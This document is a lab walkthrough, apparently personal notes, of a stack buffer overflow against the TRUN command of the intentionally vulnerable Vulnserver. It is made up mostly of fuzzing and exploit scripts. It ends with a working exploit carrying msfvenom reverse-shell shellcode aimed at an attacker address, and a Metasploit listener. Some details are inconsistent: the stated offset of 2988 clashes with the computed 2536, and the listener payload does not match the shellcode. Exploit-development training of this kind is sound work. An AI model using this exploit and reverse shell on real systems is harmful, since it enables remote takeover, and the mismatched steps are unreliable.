# BUFFER OVERFLOW - Vulnserver TRUN 

## Firstly we have to check the connection of our vulnserver by opening the vulnserver.exe in our windows machine and by runnnig it in immunity debbuger as administrator 
## Then connect it with Netcat 
```
nc <IP> port
```
### Then type 
```
HELP 
```
### We'll see a window showing the list of paramters we are going to test, that which is vulnurable
```
nc 10.10.136.133 9999
Welcome to Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
TRUN aaaaaaaaaaaaaaaaaaa
TRUN COMPLETE

```
### Well this shows we are connected to the vulnserver successfully

## Now moving to the next step - "SPIKING" -> By using genertic_send_tcp command
```
generic_send_tcp 
generic_send_tcp 192.168.1.100 701 something.spk 0 0
```

### It tells us that we need a spike script to send garbage values to the specific parameter we are going to test, So for this we are going to make a spike script known as "command.spk" contains
```
s_readline();
s_string("TRUN ");
s_string_variable("FUZZ");
```
### we can add any vaue instead of "FUZZ" we can give 'AAAA', literally anything

## Lets move on to the next step - Run the generic_send_tcp script
```
generic_send_tcp 10.10.136.133 9999 command.spk 0 0 
```
### After running the script, We can see that the Vulnserver got crashed
```
image 1
```

## Here we get to know that TRUN is vulnurable

### Now lets read some values in the debugger 
```
-> The starting value = 019FF208
-> The end value where it got crashed = 019FFBF0
```
```
image 2,3
```

### Now we have the value of staring and the end, Now lets take the help of python to see the distance between these two values, So after running python
```
>>> 0x019FFBF0 - 0x019FF208
2536
```
### Here we get the value 2988 where it got crashed, Now lets create a script to see that it is correct or not and this will help in finding our EIP also, So lets start writing our script known as fuzz.py
```
#!/usr/bin/python

import socket

s = socket.socket()
s.connect( ("10.10.228.191",9999) )

total_length = 2536

payload =[
b"TRUN /.:/",
b"A"*total_length
]

payload = b"".join(payload)

s.send(payload)

s.close()

```
### And "/.:/" is a special character we are going to add the spiker has told us this also a sweet character we are going to add in our script, look in the image
```
IMAGE4
```
## Now, Lets create a cyclic pattern
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2536 
```
or
```
msf-pattern_create -l 2536
```
### We get 
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4D
```
## The modifieds script looks like 
```
#!/usr/bin/python

import socket

s = socket.socket()
s.connect( ("10.10.228.191",9999) )

total_length = 2536

payload =[
b"TRUN /.:/",
b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4D"
]

payload = b"".join(payload)

s.send(payload)

s.close()

```
### Now after running the script we get the value of EIP 
```
EIP 386F4337
```
```
image 5 
```
### Now lets find out where our EIP is located (So we can control/rewrite that as "BBBB"), for that we are going to use "msf-patter_offset"
```
 msf-pattern_offset -l 2536 -q 386F4337                          
[*] Exact match at offset 2003
```

### Now lets again modify the script by adding the offset value
```
#!/usr/bin/python

import socket

s = socket.socket()
s.connect( ("10.10.228.191",9999) )

total_length = 2536
offset = 2003
new_eip = b"BBBB"

payload =[
b"TRUN /.:/",
b"A"* offset,
new_eip,
b"C"*( total_length - offset - len(new_eip) )
]

payload = b"".join(payload)

s.send(payload)

s.close()
```
### And by using this script we are controlling the EIP i.e this script will firstly fill the values before the EIP by "A" and the EIP overwritten by "BBBB" and the rest of the query is written by "C"
### So after running the script, We controlled the EIP as 42424242 which are BBBB shown below
```
image 6
```

## Now we use mona.py
### We have to put mona in our immunity debugger folder -> PyCommands, Which is located in
```
Program Files(x86) > Immunity Inc > Immunity Debugger > PyCommands > mona.py
```

## Now lets check mona is configure or not by using in the bottom of immunity debugger
```
!mona 
```

### Now lets the jump esp value 
```
!mona jmp -r esp
```
### Sometime mona gets dissapear so by using the cmd and after scrolling up we find the actual response of mona
```
!mona
```

## Here are the result 
```
image 7 
```


## Time to modify the script
```
#!/usr/bin/python

import socket
import struct
s = socket.socket()
s.connect( ("10.10.228.191",9999) )

total_length = 2536
offset = 2003
new_eip = struct.pack("<I", 0x62501203)

payload =[
b"TRUN /.:/",
b"A"* offset,
new_eip,
b"C"*( total_length - offset - len(new_eip) )
]

payload = b"".join(payload)

s.send(payload)

s.close()

```

### Now its time to find bad chars/ bad bytes, for that we again have to modify the script to find bad characters
```
#!/usr/bin/python

import socket
import struct

all_characters = b"".join([ struct.pack('<B' ,x) for x in range(1,256) ])

s = socket.socket()
s.connect( ("10.10.150.15",9999) )

total_length = 2988
offset = 2003
new_eip = struct.pack("<I", 0x62501203)

payload =[
b"TRUN /.:/",
b"A"* offset,
new_eip,
all_characters,
b"C"*( total_length - offset - len(new_eip) - len(all_characters) )

]

payload = b"".join(payload)

s.send(payload)

s.close()
```
### After running this script again our Vulnserver.exe got crashed and when we take a look we can see that we find a series 
```
image 8
```
### then we have to follow the dump to find the bad characters in the pattern
```
image 9,10
```

### Now we get to know there are no bad characters in the vulnserver TRUN except the null byte i.e "\x00"
### Its time to add NOP in the script (NOP -> No Operation)
```
"\x90" * 16
```
### Now lets generate the payload by using msfvenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.220.242 LPORT=4444 EXITFUNC=thread -b "\x00" -f py

```
## Now our final script
```
#!/usr/bin/python

import socket
import struct

all_characters = b"".join([ struct.pack('<B' ,x) for x in range(1,256) ])

s = socket.socket()
s.connect( ("10.10.150.15",9999) )

total_length = 2988
offset = 2003
new_eip = struct.pack("<I", 0x62501203)  # jmp esp

nop_sled = b"\x90" * 16

buf =  b""
buf += b"\xdd\xc5\xd9\x74\x24\xf4\xba\x5c\x89\x55\x10\x5e\x29"
buf += b"\xc9\xb1\x52\x83\xee\xfc\x31\x56\x13\x03\x0a\x9a\xb7"
buf += b"\xe5\x4e\x74\xb5\x06\xae\x85\xda\x8f\x4b\xb4\xda\xf4"
buf += b"\x18\xe7\xea\x7f\x4c\x04\x80\xd2\x64\x9f\xe4\xfa\x8b"
buf += b"\x28\x42\xdd\xa2\xa9\xff\x1d\xa5\x29\x02\x72\x05\x13"
buf += b"\xcd\x87\x44\x54\x30\x65\x14\x0d\x3e\xd8\x88\x3a\x0a"
buf += b"\xe1\x23\x70\x9a\x61\xd0\xc1\x9d\x40\x47\x59\xc4\x42"
buf += b"\x66\x8e\x7c\xcb\x70\xd3\xb9\x85\x0b\x27\x35\x14\xdd"
buf += b"\x79\xb6\xbb\x20\xb6\x45\xc5\x65\x71\xb6\xb0\x9f\x81"
buf += b"\x4b\xc3\x64\xfb\x97\x46\x7e\x5b\x53\xf0\x5a\x5d\xb0"
buf += b"\x67\x29\x51\x7d\xe3\x75\x76\x80\x20\x0e\x82\x09\xc7"
buf += b"\xc0\x02\x49\xec\xc4\x4f\x09\x8d\x5d\x2a\xfc\xb2\xbd"
buf += b"\x95\xa1\x16\xb6\x38\xb5\x2a\x95\x54\x7a\x07\x25\xa5"
buf += b"\x14\x10\x56\x97\xbb\x8a\xf0\x9b\x34\x15\x07\xdb\x6e"
buf += b"\xe1\x97\x22\x91\x12\xbe\xe0\xc5\x42\xa8\xc1\x65\x09"
buf += b"\x28\xed\xb3\x9e\x78\x41\x6c\x5f\x28\x21\xdc\x37\x22"
buf += b"\xae\x03\x27\x4d\x64\x2c\xc2\xb4\xef\x59\x1a\x6a\x1d"
buf += b"\x35\x1e\x92\xf3\x9a\x97\x74\x99\x32\xfe\x2f\x36\xaa"
buf += b"\x5b\xbb\xa7\x33\x76\xc6\xe8\xb8\x75\x37\xa6\x48\xf3"
buf += b"\x2b\x5f\xb9\x4e\x11\xf6\xc6\x64\x3d\x94\x55\xe3\xbd"
buf += b"\xd3\x45\xbc\xea\xb4\xb8\xb5\x7e\x29\xe2\x6f\x9c\xb0"
buf += b"\x72\x57\x24\x6f\x47\x56\xa5\xe2\xf3\x7c\xb5\x3a\xfb"
buf += b"\x38\xe1\x92\xaa\x96\x5f\x55\x05\x59\x09\x0f\xfa\x33"
buf += b"\xdd\xd6\x30\x84\x9b\xd6\x1c\x72\x43\x66\xc9\xc3\x7c"
buf += b"\x47\x9d\xc3\x05\xb5\x3d\x2b\xdc\x7d\x5d\xce\xf4\x8b"
buf += b"\xf6\x57\x9d\x31\x9b\x67\x48\x75\xa2\xeb\x78\x06\x51"
buf += b"\xf3\x09\x03\x1d\xb3\xe2\x79\x0e\x56\x04\x2d\x2f\x73"

shellcode= buf

payload =[
b"TRUN /.:/",
b"A"* offset,
new_eip,
nop_sled,
shellcode,
b"C"*( total_length - offset - len(new_eip) - len(nop_sled) - len (shellcode) )

]

payload = b"".join(payload)

s.send(payload)

s.close()
```

### Lets start a listner on our machine using msfconsole 
```
msfconsole -q                                                                 
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.9.220.242
LHOST => 10.9.220.242                                                                  
msf6 exploit(multi/handler) > set LPORT 4444                                           
LPORT => 4444                                                                          
msf6 exploit(multi/handler) > run 
```

## And boom we are inside the vulnserver 
